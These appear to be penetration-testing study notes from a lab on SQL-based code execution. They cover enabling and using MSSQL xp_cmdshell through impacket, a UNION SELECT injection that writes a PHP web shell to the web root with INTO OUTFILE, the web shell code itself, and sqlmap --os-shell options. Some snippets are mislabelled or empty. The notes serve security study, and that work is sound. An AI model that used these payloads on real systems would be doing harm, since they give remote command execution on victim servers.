### Manual Code Execution

In Microsoft SQL Server (MSSQL):
_xp_cmdshell_ function takes strings and gives them to command shell for execution 

Enabling xp_cmdshell feature

```MSSQL
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

Executing Commands via xp_cmdshell

```MSSQL
SQL> EXECUTE xp_cmdshell 'whoami';
output

NULL
```

For RCE, we _can_ abuse the [_SELECT INTO_OUTFILE_](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) statement to write files on the web server. (if we have write permissions)

Write a WebShell To Disk via INTO OUTFILE directive

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
Resulting PHP reverse shell

```
<? system($_REQUEST['cmd']); ?>
```
Writing the WebShell to Disk

Received error, but shouldn't impact file write.

Gain an interactive shell with the `--os-shell` parameter in sqlmap.

Start by Intercepting the POST request with Burp

```

Next, invoke sqlmap with the following parameters

`-r`- file containing POST request
`-p`- vulnerable parameter (in this ex: item)
`--os-shell`
`--web-root`- writable folder
